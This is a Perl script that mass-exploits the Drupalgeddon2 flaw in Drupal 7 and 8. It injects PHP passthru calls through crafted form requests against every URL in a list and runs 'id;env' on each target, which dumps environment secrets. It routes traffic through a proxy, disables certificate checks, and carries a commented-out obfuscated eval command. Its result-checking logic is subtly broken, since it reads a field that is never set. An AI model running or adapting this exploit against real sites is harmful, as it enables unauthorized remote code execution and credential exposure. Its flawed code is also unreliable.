#!/usr/bin/perl
use Parallel::ForkManager;
 use LWP::UserAgent;
 use HTTP::Request;
 use HTTP::Headers;
 use HTTP::CookieJar::LWP;
 use URI::URL;
 use File::Slurp qw(read_file write_file);
 use Data::Dump::Color qw(dump);
 use URI::Escape qw(uri_escape);
 use Term::ANSIColor qw(color colored);
 use JSON::XS;
 use AnyEvent::HTTP::LWP::UserAgent;
 use Coro;

# Global variables
my $DEBUG = 1;
 my $PROXY = "socks://127.0.0.1:16379";
 my $VALIDATION_REGEX = qr/[gu]id=\(\d+\)/i;
 sub display_request {
    my ( $response ) = @_;
 my $request = $response->request;
print dump($response);
    
    print "\n\n" . color("yellow") . "⟶ " . color("blue") .  
    uc($request->method) . color("cyan") . ' ' . $request->uri->path . 
    color("red") . '?' . color("yellow") . $request->uri->equery . 
    color("white") . " HTTP/1.1\n";
 print color("yellow") . "⟶ " . 
    color("white") . "Host: " .  color("cyan") . $request->uri->host . 
    "\n";

    
    foreach my $header_name (keys %{ $request->headers }) { next 
        if($header_name eq "::std_case");
 foreach my $header_value 
        ($request->header($header_name)) {
            print color("yellow") . "⟶ " . color("white") . $header_name . 
            ": " . color("cyan") . $header_value . "\n";

        }
    }
    
    print color("yellow") . "⟶ " . color("white") . 
    $request->decoded_content . "\n" if($response->decoded_content);
 print 
    "\n\n" . color("green") . "<-- " . color("white") . "HTTP/1.1 " . 
    color("cyan") . $response->status_line . "\n";

    
    foreach my $header_name (keys %{ $response->headers }) { next 
        if($header_name eq "::std_case");
 foreach my $header_value 
        ($response->header($header_name)) {
            print color("green") . "<-- " . color("white") . $header_name . 
            ": " . color("cyan") . $header_value . "\n";

        }
    }
    print "\n" . color("white") . $response->decoded_content . "\n";

}
sub drupal7_drupalgeddon { my ( $requester, $url, $command, $php_method ) = 
    @_;
 $php_method = "passthru" if(!defined($php_method) || !$php_method);
 
    my $uri = URI::URL->new($url);
 my $results = undef;
 my $request = 
    HTTP::Request->new("POST", $uri->scheme . '://' . $uri->host . ':' . 
    $uri->port . $uri->path . 
    'user/password/?name[%23post_render][]=' . $php_method . 
    '&name[%23markup]=' . uri_escape($command) . 
    '&name[%23type]=markup');
 
    $request->content('form_id=user_pass&_triggering_element_name=name');
 
    $request->content_length(length($request->content));
 
    $request->content_type("application/x-www-form-urlencoded");

    
    my $response = $requester->request($request);
 
    display_request($response) if($DEBUG);
 if($response && 
    $response->is_success && $response->content && $response->content =~ 
    /name=[\\"]*form_build_id[\\"]*[^\/>]*value=[\\"]*([^\\"]+)[\\"]*/i) {
        my $request2 = HTTP::Request->new("POST", $uri->scheme . '://' . 
        $uri->host . ':' . $uri->port . $uri->path . 
        "file/ajax/name/%23value/" . $1);
 
        $request2->content('form_build_id=' . $1);
 
        $request2->content_length(length($request2->content));
 
        $request2->content_type("application/x-www-form-urlencoded");

    
        my $response2 = $requester->request($request2);
 
        display_request($response2) if($DEBUG);
 $results = 
        $response2->decoded_content;

    }
    return $results;

}
sub drupal8_drupalgeddon { my ( $requester, $url, $command, $php_method ) = 
    @_;
 $php_method = "passthru" if(!defined($php_method) || !$php_method);
 
    my $uri = URI::URL->new($url);
 my $results = undef;
 my $request = 
    HTTP::Request->new("POST", $uri->scheme . '://' . $uri->host . ':' . 
    $uri->port . $uri->path . 
    'user/register/?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax');
 
    $request->content('form_id=user_register_form&_drupal_ajax=1&mail[a][%23post_render][]=' 
    . $php_method . 
    '&mail[a][%23type]=markup&mail[a][%23markup]=' . 
    uri_escape($command));
 
    $request->content_length(length($request->content));
 
    $request->content_type("application/x-www-form-urlencoded");

    
    my $response = $requester->request($request);
 
    display_request($response) if($DEBUG);
 if($response && 
    $response->is_success && $response->decoded_content) {
        $results = $response->decoded_content;

    }
    return $results;

}
sub print_vulnerable { my ( $url, $affected_version ) = @_;
 print 
    color("green") . "[VULNERABLE] " . color("yellow") . "[Drupal " . 
    color("red") . $affected_version . color("yellow") . "] " . 
    color("cyan") . "$url\n";

}
sub main { my ( $urls_file ) = @_;
 my $requester = 
    AnyEvent::HTTP::LWP::UserAgent->new(
        agent => "Mozilla/5.0 (Linux; Android 7.0; PLUS Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36", parse_head => 1, no_proxy => ['127.0.0.1', 
        'localhost', '192.168.1.0/24'], timeout => 20, cookie_jar => 
        HTTP::CookieJar::LWP->new(
            file => "/tmp/drupalgeddon.lwp.cookies", autosave => 1, 
            ignore_discard => 1
        ), send_te => 0, protocols_allowed => ['http', 'https', 'ftp', 
        'ftps'], protocols_forbidden => ['file', 'mailto', 'ssh'], 
        requests_redirectable => 
        ['OPTIONS','GET','HEAD','POST','PUT','DELETE','TRACE'], ssl_opts => 
        {
            SSL_verify_mode => 0, verify_hostname => 0, SSL_version => 
            'TLSv1:!TLSv11:!TLSv12:!SSLv2:!SSLv3',
        },
        default_headers => => HTTP::Headers->new( 'Accept' => 
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
            'Accept-Language' => 'en-US,en;q=0.5', 'DNT' => '1', 
            'Connection' => 'close', 'Upgrade-Insecure-Requests' => '1', 
            'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache',
        ), );
 $requester->proxy(['http','https','ftp','ftps'], $PROXY) 
    if($PROXY);

    # my $command = 'v=\$' . "'" . 
    # '\x20echo\x20X2hlbGxpc2NvbWluZ18K|base64\x20-d' . "'" . '&&eval\$v';

    my $command='id;env';
 my $results = {};
 if($urls_file && -f $urls_file) 
    {
        my @coro = map { my $url = $_;
 async { return if(!defined($url) || 
             !$url);

             $results->{$url} = {};
 $results->{$url}->{drupal7} = { 
             vulnerable => 0, version => "7.X", response => 
             drupal7_drupalgeddon($requester, $url, $command) };
 
             if($results->{$url}->{drupal7}->{content} && 
             $results->{$url}->{drupal7}->{content} =~ $VALIDATION_REGEX) {
                 $results->{$url}->{drupal7}->{vulnerable} = 1;

             } else {
                 $results->{$url}->{drupal8} = { vulnerable => 0, version 
                 => " 8.X", response => drupal8_drupalgeddon($requester, 
                 $url, $command) };
 
                 $results->{$url}->{drupal8}->{vulnerable} = 1 
                 if($results->{$url}->{drupal8}->{content} && 
                 $results->{$url}->{drupal8}->{content} =~ 
                 $VALIDATION_REGEX);

                      
             }
            }
        } split(/[\n\r]/, read_file($urls_file));

        $_->join for @coro;

     }
    return $results;

}
if($ARGV[0]) { my $results =main($ARGV[0]);
 
    write_file("/tmp/drupalgeddon.json", 
    JSON::XS->new->utf8->pretty->encode($results));

} else {
    print "Usage: $0 <urls file>\n";

}
